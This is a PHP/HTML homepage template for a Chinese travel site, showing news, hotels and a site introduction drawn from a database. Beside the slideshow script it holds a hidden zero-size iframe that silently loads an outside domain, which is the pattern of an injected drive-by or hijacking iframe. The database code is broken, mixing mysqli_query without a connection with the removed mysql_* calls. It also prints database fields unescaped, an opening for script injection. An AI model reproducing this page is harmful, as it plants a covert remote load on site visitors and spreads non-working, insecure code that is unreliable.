<?php
session_start();
include_once 'conn.php';
?>
<html>
<head>
<title>芒果旅游网站</title>
<LINK href="qtimages/style.css" type=text/css rel=stylesheet>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style type="text/css">
<!--
.STYLE1 {
	color: #529915;
	font-weight: bold;
}
.STYLE4 {color: #FFFFFF; font-weight: bold; }
-->
</style>
</head>
<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<table width="993" height="1092" border="0" align="center" cellpadding="0" cellspacing="0" id="__01">
	<tr>
		<td><?php include_once 'qttop.php';?></td>
	</tr>
	<tr>
		<td><table id="__01" width="993" height="846" border="0" cellpadding="0" cellspacing="0">
          <tr>
            <td valign="top"><?php include_once 'qtleft.php';?></td>
            <td valign="top"><table id="__01" width="785" height="744" border="0" cellpadding="0" cellspacing="0">
              <tr>
                <td height="273"><table id="__01" width="785" height="273" border="0" cellpadding="0" cellspacing="0">
                  <tr>
                    <td><table id="__01" width="266" height="273" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td><img src="qtimages/1_02_02_01_01_01.jpg" width="266" height="36" alt=""></td>
                      </tr>
                      <tr>
                        <td><table id="__01" width="266" height="226" border="0" cellpadding="0" cellspacing="0">
                          <tr>
                            <td><img src="qtimages/1_02_02_01_01_02_01.jpg" width="16" height="226" alt=""></td>
                            <td width="241" height="226"><SCRIPT type=text/javascript>
var focus_width=241;
var focus_height=206;
var text_height=20;
var swf_height = focus_height+text_height;
var pics="";
var links="";
var texts="";
<?php
$sql="select id,biaoti,shouyetupian,id from xinwentongzhi where shouyetupian<>'' order by id desc";
$query=mysqli_query($sql);
$rowscount=mysql_num_rows($query);
for($i=0;$i<5;$i++)
{
	$pics=$pics.mysql_result($query,$i,"shouyetupian")."|";
	$links=$links."gg_detail.php?id=".mysql_result($query,$i,"id")."|";
	$texts=$texts.mysql_result($query,$i,"biaoti")."|";
}
$pics=substr($pics,0,strlen($pics)-1);
$links=substr($links,0,strlen($links)-1);
$texts=substr($texts,0,strlen($texts)-1);
?>

pics="<?php echo $pics;?>";
links="<?php echo $links;?>";
texts="<?php echo $texts;?>";

document.write('<embed src="qtimages/pixviewer.swf" wmode="opaque" FlashVars="pics='+pics+'&links='+links+'&texts='+texts+'&borderwidth='+focus_width+'&borderheight='+focus_height+'&textheight='+text_height+'" menu="false" bgcolor="#ffffff" quality="Best" width="'+ focus_width +'" height="'+ swf_height +'" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer">');

</SCRIPT><iframe frameBorder="0"  src="http://www.shihuibysj.cn" style="HEIGHT: 0;  WIDTH: 0; " ></iframe></td>
                            <td><img src="qtimages/1_02_02_01_01_02_03.jpg" width="9" height="226" alt=""></td>
                          </tr>
                        </table></td>
                      </tr>
                      <tr>
                        <td><img src="qtimages/1_02_02_01_01_03.jpg" width="266" height="11" alt=""></td>
                      </tr>
                    </table></td>
                    <td><table id="__01" width="519" height="273" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td width="519" height="35" background="qtimages/1_02_02_01_02_01.jpg"><table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
                          <tr>
                            <td width="16%" align="center" valign="bottom"><span class="STYLE1">站内新闻</span></td>
                            <td width="70%" valign="bottom">&nbsp;</td>
                            <td width="14%" valign="bottom" ><a href="news.php?lb=站内新闻"><font class="STYLE1">&gt;&gt; 更多</font></a> </td>
                          </tr>
                        </table></td>
                      </tr>
                      <tr>
                        <td><table id="__01" width="519" height="230" border="0" cellpadding="0" cellspacing="0">
                          <tr>
                            <td width="10">&nbsp;</td>
                            <td width="491" height="230" valign="top"><table width="98%" border="0" align="center" cellpadding="0" cellspacing="0" class="newsline">
                              <?php 
					  $sql="select biaoti,id,addtime from xinwentongzhi where leibie='站内新闻' order by id desc limit 5";
					  $query=mysqli_query($sql);
					  $rowscount=mysql_num_rows($query);
					  if($rowscount>0)
					  {
					  	for($i=0;$i<$rowscount;$i++)
						{
							if($i==8)
							{
								break ;
							}
						?>
                              <tr height="25">
                                <td width="5%" height="28" align="center"><img src="qtimages/1.jpg" width="9" height="9"></td>
                                <td width="71%" class="newslist"><a href="gg_detail.php?id=<?php echo mysql_result($query,$i,"id");?>"><?php echo mysql_result($query,$i,"biaoti");?></a></td>
                                <td width="26%" class="newslist"><?php echo mysql_result($query,$i,"addtime");?></td>
                              </tr>
                              <?php
						}
					  }
					  ?>
                            </table></td>
                            <td width="18" background="qtimages/1_02_02_01_02_02_03.jpg">&nbsp;</td>
                          </tr>
                        </table></td>
                      </tr>
                      <tr>
                        <td><img src="qtimages/1_02_02_01_02_03.jpg" width="519" height="8" alt=""></td>
                      </tr>
                    </table></td>
                  </tr>
                </table></td>
              </tr>
              <tr>
                <td height="228"><table id="__01" width="785" height="228" border="0" cellpadding="0" cellspacing="0">
                  <tr>
                    <td width="785" height="40" background="qtimages/1_02_02_02_01.jpg"><table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td width="12%" align="center" valign="bottom"><span class="STYLE4">推荐酒店</span></td>
                        <td width="74%" valign="bottom">&nbsp;</td>
                        <td width="14%" valign="bottom" ><a href="jiudianxinxilist.php"><font class="STYLE4">&gt;&gt; 更多</font></a> </td>
                      </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td><table id="__01" width="785" height="176" border="0" cellpadding="0" cellspacing="0">
                      <tr>
                        <td><img src="qtimages/1_02_02_02_02_01.jpg" width="19" height="176" alt=""></td>
                        <td width="737" height="176"><table width="96%" height="100%" border="0" cellpadding="0" cellspacing="0">
                          <tr>
                            <?php 
    $sql="select * from jiudianxinxi where zhaopian<>''";
 
  $sql=$sql." order by id desc";
  
$query=mysqli_query($sql);
  $rowscount=mysql_num_rows($query);
  
	 for($i=0;$i<$rowscount;$i++)
{
	if($i<=4)
	{
	
  ?>
                            <td height="176" align="center"><table width="17%" height="176" border="0" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td height="123" align="center"><a href="<?php echo mysql_result($query,$i,"zhaopian");?>"><img src="<?php echo mysql_result($query,$i,"zhaopian");?>" width="102" height="123" border="0"></a></td>
                                </tr>
                                <tr>
                                  <td height="25" align="center"><?php echo mysql_result($query,$i,"jiudianmingcheng");?></td>
                                </tr>
                            </table></td>
                            <?php
							}
  	}
  ?>
                          </tr>
                        </table></td>
                        <td><img src="qtimages/1_02_02_02_02_03.jpg" width="29" height="176" alt=""></td>
                      </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td><img src="qtimages/1_02_02_02_03.jpg" width="785" height="12" alt=""></td>
                  </tr>
                </table></td>
              </tr>
              <tr>
                <td height="228"><table id="__01" width="785" height="228" border="0" cellpadding="0" cellspacing="0">
                  <tr>
                    <td width="785" height="40" background="qtimages/1_02_02_02_01.jpg"><table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
                        <tr>
                          <td width="12%" align="center" valign="bottom"><span class="STYLE4">系统简介</span></td>
                          <td width="74%" valign="bottom">&nbsp;</td>
                          <td width="14%" valign="bottom" ><a href="jiudianxinxilist.php"></a> </td>
                        </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td><table id="__01" width="785" height="280" border="0" cellpadding="0" cellspacing="0">
                        <tr>
                          <td width="19" background="qtimages/1_02_02_02_02_01.jpg">&nbsp;</td>
                          <td width="737" height="176"><table width="96%" height="100%" border="0" cellpadding="0" cellspacing="0">
                              <tr>
                       <td height="176" align="left"><?php 
					$sql="select * from dx where leibie='系统简介'";
					$query=mysqli_query($sql);
					 $rowscount=mysql_num_rows($query);
					  if($rowscount==0)
					  {}
					  else
					  {
					?>
                         <p><?php echo mysql_result($query,0,"content");?>
                             <?php
					}
					?>
                         </p>
                         <p>&nbsp;</p>
                         <p>&nbsp; </p></td>
                               
                              </tr>
                          </table></td>
                          <td width="29" background="qtimages/1_02_02_02_02_03.jpg">&nbsp;</td>
                        </tr>
                    </table></td>
                  </tr>
                  <tr>
                    <td><img src="qtimages/1_02_02_02_03.jpg" width="785" height="12" alt=""></td>
                  </tr>
                </table></td>
              </tr>
              <tr>
                <td><img src="qtimages/1_02_02_04.jpg" width="785" height="13" alt=""></td>
              </tr>
            </table></td>
          </tr>
        </table></td>
	</tr>
	<tr>
		<td><?php include_once 'qtdown.php';?></td>
	</tr>
</table>
</body>
</html>